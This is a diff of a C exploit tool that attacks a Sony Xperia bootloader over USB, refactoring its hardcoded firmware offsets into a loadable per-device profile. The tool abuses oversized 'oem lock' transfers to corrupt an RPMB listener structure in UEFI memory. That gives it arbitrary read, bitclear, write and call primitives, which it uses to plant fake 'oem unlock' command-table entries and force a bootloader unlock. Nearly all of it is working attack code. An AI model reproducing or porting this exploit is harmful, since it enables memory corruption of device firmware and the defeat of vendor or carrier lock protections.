@@ -2,6 +2,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <stdint.h>
+#include <inttypes.h>
+#include <errno.h>
 #include <libusb-1.0/libusb.h>
 
 #define BB_VID 0x0fce
@@ -127,29 +130,112 @@ void destroy_usb_device(libusb_device_handle *h)
 
 #include <unistd.h>
 
-// Offsets for Xperia 5 Docomo SO-01M P42
+typedef struct {
+    uint64_t clock_dxe_addr;
+    uint64_t clock_bitclear_offset;
+    uint64_t ufs_dxe_addr;
+    uint64_t ufs_listener_offset;
+    uint64_t usb_buffer_addr;
+    uint64_t original_rpmb_protocol_addr;
+    uint64_t original_listener_offset;
+    uint64_t listener_alloc_size;
+    uint64_t rpmb_protocol_offset;
+    uint64_t listener_buffer_offset;
+    uint64_t protocol_buffer_offset;
+    uint64_t linux_loader_base;
+    uint64_t cmdline_pointer_offset;
+    uint64_t oem_unlock_string_offset;
+    uint64_t unlock_handler_offset;
+    uint64_t command_table_start;
+    uint64_t command_table_end;
+} device_profile;
 
-static const uint64_t clockDxeAddr = 0x1FFE3E000;
-static const uint64_t clockDxe_BitclearPrimitive_Offset = 0x11B7C;
+static device_profile profile;
 
-static const uint64_t ufsDxeAddr = 0x1FF5EB000;
-static const uint64_t ufsDxe_RPMBListenerParams_Offset = 0x1b7a8;
+static int load_profile(const char *path)
+{
+    static const char *keys[] = {
+        "clock_dxe_addr", "clock_bitclear_offset", "ufs_dxe_addr",
+        "ufs_listener_offset", "usb_buffer_addr", "original_rpmb_protocol_addr",
+        "original_listener_offset", "listener_alloc_size", "rpmb_protocol_offset", "listener_buffer_offset",
+        "protocol_buffer_offset", "linux_loader_base", "cmdline_pointer_offset",
+        "oem_unlock_string_offset", "unlock_handler_offset", "command_table_start",
+        "command_table_end"
+    };
+    uint64_t *values[] = {
+        &profile.clock_dxe_addr, &profile.clock_bitclear_offset, &profile.ufs_dxe_addr,
+        &profile.ufs_listener_offset, &profile.usb_buffer_addr,
+        &profile.original_rpmb_protocol_addr, &profile.original_listener_offset,
+        &profile.listener_alloc_size,
+        &profile.rpmb_protocol_offset, &profile.listener_buffer_offset,
+        &profile.protocol_buffer_offset, &profile.linux_loader_base,
+        &profile.cmdline_pointer_offset, &profile.oem_unlock_string_offset,
+        &profile.unlock_handler_offset, &profile.command_table_start,
+        &profile.command_table_end
+    };
+    unsigned int seen = 0;
+    char line[256];
+    FILE *file = fopen(path, "r");
+    if (!file) {
+        fprintf(stderr, "cannot open profile %s: %s\n", path, strerror(errno));
+        return -1;
+    }
 
-static const uint64_t usbBufAddr = 0xFFC04000;
-
-static const uint64_t OriginalRPMBProtocolAddr = 0x1FF604D70;
-
-// original, relative to usbBufAddr
-static const uint64_t RPMBListenerParams_Offset = 0x3D6000;
-
-// relative to RPMBListenerParamsAddr
-static const uint64_t RPMBProtocol_Offset = 0x23008;
-
-// relative to usbBufAddr
-uint64_t OurRPMBListenerParams_Offset = 0x56000;
-
-// relative to usbBufAddr
-uint64_t OurRPMBProtocol_Offset = 0x46000;
+    while (fgets(line, sizeof(line), file)) {
+        char key[128], value[128], extra;
+        if (line[0] == '#' || line[0] == '\n' || line[0] == '\r')
+            continue;
+        if (sscanf(line, " %127[^= \t] = %127s %c", key, value, &extra) != 2) {
+            fprintf(stderr, "invalid profile line: %s", line);
+            fclose(file);
+            return -1;
+        }
+        unsigned int i;
+        for (i = 0; i < sizeof(keys) / sizeof(keys[0]); ++i)
+            if (strcmp(key, keys[i]) == 0)
+                break;
+        if (i == sizeof(keys) / sizeof(keys[0]) || (seen & (1u << i))) {
+            fprintf(stderr, "unknown or duplicate profile key: %s\n", key);
+            fclose(file);
+            return -1;
+        }
+        char *end;
+        errno = 0;
+        uintmax_t parsed = strtoumax(value, &end, 0);
+        if (errno || end == value || *end) {
+            fprintf(stderr, "invalid integer for %s: %s\n", key, value);
+            fclose(file);
+            return -1;
+        }
+        *values[i] = (uint64_t)parsed;
+        seen |= 1u << i;
+    }
+    if (ferror(file)) {
+        perror("reading profile");
+        fclose(file);
+        return -1;
+    }
+    fclose(file);
+    if (seen != (1u << (sizeof(keys) / sizeof(keys[0]))) - 1) {
+        fprintf(stderr, "profile is missing required offsets\n");
+        return -1;
+    }
+    if (profile.command_table_start >= profile.command_table_end ||
+        profile.command_table_start % 32 || profile.command_table_end % 32) {
+        fprintf(stderr, "invalid command table range in profile\n");
+        return -1;
+    }
+    if (profile.original_listener_offset > 0x1000000 || profile.listener_alloc_size > 0x1000000 ||
+        profile.rpmb_protocol_offset > 0x1000000 || profile.listener_buffer_offset > 0x1000000 ||
+        profile.protocol_buffer_offset > 0x1000000 ||
+        profile.original_listener_offset + profile.rpmb_protocol_offset + 40 > 0x1000000 ||
+        profile.listener_buffer_offset + profile.rpmb_protocol_offset + 40 > 0xf0001 ||
+        profile.protocol_buffer_offset + 40 > 0xf0001) {
+        fprintf(stderr, "profile buffer offsets exceed the transfer buffer limits\n");
+        return -1;
+    }
+    return 0;
+}
 
 void init_primitive(libusb_device_handle *h)
 {
@@ -157,24 +243,24 @@ void init_primitive(libusb_device_handle *h)
     char resBuf[resBufMaxSize] = {0};
 
     static const size_t allocatedBufSize = 0x1000000;
-    static const size_t bufSize = (0x3F9008 + 40);
+    const size_t bufSize = profile.original_listener_offset + profile.rpmb_protocol_offset + 40;
     uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);
 
     memset(buf, 0x0, bufSize);
 
     {
-        uint32_t off = (RPMBListenerParams_Offset + RPMBProtocol_Offset);
+        uint32_t off = (profile.original_listener_offset + profile.rpmb_protocol_offset);
 
-        *(uint64_t *)(buf + off) = (usbBufAddr + off); // real address of itself (X0)
+        *(uint64_t *)(buf + off) = (profile.usb_buffer_addr + off); // real address of itself (X0)
 
-        *(uint64_t *)(buf + off + 8) = (ufsDxeAddr + ufsDxe_RPMBListenerParams_Offset); // (lower part)
+        *(uint64_t *)(buf + off + 8) = (profile.ufs_dxe_addr + profile.ufs_listener_offset); // (lower part)
 
         // 0xFFFDA000 = usbBufAddr + RPMBListenerParams_Offset
         // 0xFFFDA000 -> 0xFFC5A000
         // so that it can be part of usb buffer, no more cache problems
-        *(uint32_t *)(buf + off + 16) = 0x380000;
+        *(uint32_t *)(buf + off + 16) = profile.listener_alloc_size;
 
-        *(uint64_t *)(buf + off + 32) = (clockDxeAddr + clockDxe_BitclearPrimitive_Offset);
+        *(uint64_t *)(buf + off + 32) = (profile.clock_dxe_addr + profile.clock_bitclear_offset);
     }
 
     sprintf(buf, "oem lock");
@@ -198,9 +284,9 @@ void restore(libusb_device_handle *h)
     memset(buf, 0x0, bufSize);
 
     {
-        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);
+        uint32_t off = (profile.listener_buffer_offset + profile.rpmb_protocol_offset);
 
-        *(uint64_t *)(buf + off) = OriginalRPMBProtocolAddr;
+        *(uint64_t *)(buf + off) = profile.original_rpmb_protocol_addr;
     }
 
     sprintf(buf, "oem lock");
@@ -231,15 +317,15 @@ void bitclear_primitive_4(libusb_device_handle *h, uint64_t addr, uint32_t mask)
     memset(buf, 0x0, bufSize);
 
     {
-        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);
-        uint32_t off2 = OurRPMBProtocol_Offset;
+        uint32_t off = (profile.listener_buffer_offset + profile.rpmb_protocol_offset);
+        uint32_t off2 = profile.protocol_buffer_offset;
 
-        *(uint64_t *)(buf + off) = (usbBufAddr + off2);
+        *(uint64_t *)(buf + off) = (profile.usb_buffer_addr + off2);
 
         *(uint64_t *)(buf + off2 + 8) = addr;
         *(uint32_t *)(buf + off2 + 16) = mask;
 
-        *(uint64_t *)(buf + off2 + 32) = (clockDxeAddr + clockDxe_BitclearPrimitive_Offset);
+        *(uint64_t *)(buf + off2 + 32) = (profile.clock_dxe_addr + profile.clock_bitclear_offset);
     }
 
     sprintf(buf, "oem lock");
@@ -271,7 +357,7 @@ void read_primitive_8(libusb_device_handle *h, uint64_t addr)
     memset(buf, 0x0, bufSize);
 
     {
-        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);
+        uint32_t off = (profile.listener_buffer_offset + profile.rpmb_protocol_offset);
 
         *(uint64_t *)(buf + off) = (addr - 32);
     }
@@ -304,10 +390,10 @@ void call_primitive(libusb_device_handle *h, uint64_t addr)
     memset(buf, 0x0, bufSize);
 
     {
-        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);
-        uint32_t off2 = OurRPMBProtocol_Offset;
+        uint32_t off = (profile.listener_buffer_offset + profile.rpmb_protocol_offset);
+        uint32_t off2 = profile.protocol_buffer_offset;
 
-        *(uint64_t *)(buf + off) = (usbBufAddr + off2);
+        *(uint64_t *)(buf + off) = (profile.usb_buffer_addr + off2);
         *(uint64_t *)(buf + off2 + 32) = addr;
     }
 
@@ -389,6 +475,14 @@ void get_RPMBListenerParams_RPMBProtocol_Offset(libusb_device_handle *h)
 
 int main(int argc, char **argv)
 {
+    const char *profile_path = argc > 1 ? argv[1] : "profiles/xperia5-so01m-p42.conf";
+    if (argc > 2) {
+        fprintf(stderr, "usage: %s [device-profile.conf]\n", argv[0]);
+        return 2;
+    }
+    if (load_profile(profile_path) < 0)
+        return 2;
+
     if (libusb_init(NULL) < 0)
     {
         printf("[ERROR] main: libusb_init failed\n");
@@ -440,17 +534,14 @@ int main(int argc, char **argv)
         //read_primitive_8(h, (sdccDxeBase + sdccDxe_RPMBListenerParams_Offset));
 
         // OriginalRPMBProtocol = 0x1FF604D70
-        read_primitive_8(h, (0xFFADB000 + RPMBProtocol_Offset));
+        read_primitive_8(h, (0xFFADB000 + profile.rpmb_protocol_offset));
     }
 
 #endif
 
     {
-        static const uint64_t linuxLoaderBase = 0x1FD5A8000;
-        static const uint64_t cmdline_offset = 0xB6550; // last cmdline pointer
-
         // cmdline = 0x1FD77E398 or 0x1FD77EA18 or 0x1FD77E018
-        //read_primitive_8(h, (linuxLoaderBase + cmdline_offset));
+        //read_primitive_8(h, (profile.linux_loader_base + profile.cmdline_pointer_offset));
 
 #if 0
 
@@ -463,22 +554,19 @@ int main(int argc, char **argv)
 
 #endif
 
-        static const uint64_t oemunlockStr_offset = 0x97aed;
-        static const uint64_t unlockFunc_offset = 0x3ecd0;
-
         // these region is 0xff filled, so we can write any value we want here
 
-        for (uint64_t addr = 0xFD77D018; addr < 0xFD77FA00; addr += 32)
+        for (uint64_t addr = profile.command_table_start; addr < profile.command_table_end; addr += 32)
         {
             write_primitive_8(h, addr, 0x0);
-            write_primitive_8(h, addr + 8, (linuxLoaderBase + oemunlockStr_offset));
+            write_primitive_8(h, addr + 8, (profile.linux_loader_base + profile.oem_unlock_string_offset));
             write_primitive_8(h, addr + 16, strlen("oem unlock"));
-            write_primitive_8(h, addr + 24, (linuxLoaderBase + unlockFunc_offset));
+            write_primitive_8(h, addr + 24, (profile.linux_loader_base + profile.unlock_handler_offset));
         }
 
         // set high part of cmdline pointer to 0
         // 0x1FD77E398 -> 0xFD77E398
-        write_primitive_4(h, (linuxLoaderBase + cmdline_offset + 4), 0x0);
+        write_primitive_4(h, (profile.linux_loader_base + profile.cmdline_pointer_offset + 4), 0x0);
 
         restore(h);
 
